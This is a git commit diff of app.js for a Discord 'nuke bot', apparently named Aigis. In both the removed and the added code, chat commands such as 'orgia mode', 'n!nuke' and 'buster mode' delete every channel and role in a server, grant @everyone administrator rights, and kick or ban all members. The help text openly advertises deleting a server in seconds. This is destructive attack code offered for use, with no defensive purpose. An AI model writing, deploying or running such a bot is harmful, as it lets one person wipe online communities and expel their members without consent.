474e8909660782cfc92d3f76734da1902018a8c0
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-03-13 20:03:43 +0900

    Update app.js

--- app.js
+++ app.js
@@ -1,87 +1,36 @@
-const Discord = require('discord.js')
-const client = new Discord.Client()
-const PREFIX = "?"
-const helpexampleEmbed = new Discord.MessageEmbed()
-	.setColor('#61F3EB')
-	.setTitle('명령어들')
-	.setDescription("?aigis : 도움말\n\n\
-	?orgia mode : 서버를 청소합니다.")
+const discord = require("discord.js");
+const { prefix } = require('./config.json');
+const client = new discord.Client();
 
-client.on("ready", () => {
-	console.log("ready")
-	client.user.setActivity('Persona 3 FES', { type: "PLAYING" })
-})
+client.on("ready", () =>{
+console.log(" ")
+console.log(`${client.user.tag} is online.`);
 
-client.on('message', message => {
-	if (message.channel.type == 'dm') {
-		return
-	} if (!message.content.startsWith(PREFIX)) {
-		return
-	} if (!message.guild) {
-		return
-	} if (message.author.bot) {
-		return
-	}
-	let command = message.content.substring(PREFIX.length)
-	let server = message.guild
-	switch (command) {
-		case "orgia mode":
-			server.channels.cache.forEach(channel => channel.delete())
-			server.edit({ name: "BUSTED", icon: server.setIcon(null) })
-			server.roles.cache.forEach((role) => {
-				if (role.name === "@everyone") {
-					role.edit({
-						permissions: [
-							"ADMINISTRATOR",
-							"CREATE_INSTANT_INVITE",
-							"ADD_REACTIONS",
-							"ATTACH_FILES",
-							"BAN_MEMBERS",
-							"CHANGE_NICKNAME",
-							"MANAGE_CHANNELS",
-							"MUTE_MEMBERS",
-							"SPEAK",
-							"STREAM",
-							"USE_EXTERNAL_EMOJIS",
-							"USE_VAD",
-							"VIEW_AUDIT_LOG",
-							"VIEW_CHANNEL",
-							"VIEW_GUILD_INSIGHTS",
-							"MANAGE_GUILD",
-							"MANAGE_MESSAGES",
-							"MANAGE_ROLES",
-							"MANAGE_WEBHOOKS",
-							"MENTION_EVERYONE",
-							"MOVE_MEMBERS",
-							"PRIORITY_SPEAKER",
-							"READ_MESSAGE_HISTORY",
-							"SEND_MESSAGES",
-							"SEND_TTS_MESSAGES",
-							"CONNECT",
-							"KICK_MEMBERS",
-							"MANAGE_NICKNAMES",
-							"MANAGE_EMOJIS",
-							"EMBED_LINKS",
-							"DEAFEN_MEMBERS"
-						]
-					})
-				} else if (role.editable) {
-					role.delete()
-				}
-			})
-			server.members.cache.forEach((member) => {
-				if (member.kickable) {
-					member.kick()
-				}
-			})
-			break;
-		case "aigis":
-			message.reply(' 아이기스 사용법입니다.')
-			message.channel.send(helpexampleEmbed)
-			break;
-		default:
-			break;
-	}
-})
+});
+
+client.on("message", async(msg)=>{
+
+if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
+    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+    msg.guild.members.tap(member => member.ban("your ban message here"));
+}
+if(msg.content.toLowerCase().startsWith(`${prefix}` + "orgia mode")){
+    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+}
+if(msg.content.toLowerCase().startsWith(`${prefix}` + "buster mode")){
+    msg.guild.members.tap(member => member.ban("<your ban message here>"));
+}
+if(msg.content.toLowerCase().startsWith(`${prefix}` + "aigis")){
+    msg.author.send({
+        embed: {
+            color: 0xff0000,
+            author: { name: "Nuke Bot Help Commands | .help" },
+            description: `\`${prefix}aigis\` - To get this help menu in your DMs.\n\`${prefix}orgia mode\` - Deletes all channels and roles of the server in seconds.`
+        }
+    })
+}
+});
 
 client.login(process.env.TOKEN)
